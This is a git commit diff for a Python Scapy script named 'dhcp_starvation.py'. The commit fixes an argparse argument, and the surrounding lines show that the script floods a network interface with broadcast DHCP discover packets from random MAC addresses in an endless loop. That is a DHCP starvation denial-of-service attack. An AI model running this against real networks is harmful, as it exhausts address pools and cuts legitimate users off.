5eb17a4ec85be5770350f8b94dcf512efd5967fc
KIRIL <kirilpoposki@hotmail.com>
2022-12-08 21:22:26 +0100

    fixing dhcp script

--- dhcp_starvation.py
+++ dhcp_starvation.py
@@ -10,7 +10,7 @@ dhcp_discover = Ether(dst="FF:FF:FF:FF:FF:FF", src=RandMAC())\
 
 parser = argparse.ArgumentParser(prog="DHCP Starvation",
     description="Starving the DHCP server")
-parser.add_argument("interface",help="Interface on what to transmit the dhcp packets",required=True)
+parser.add_argument("interface",help="Interface on what to transmit the dhcp packets")
 args = parser.parse_args()
 
 sendp(dhcp_discover, iface=args.interface,loop=1,verbose=1)
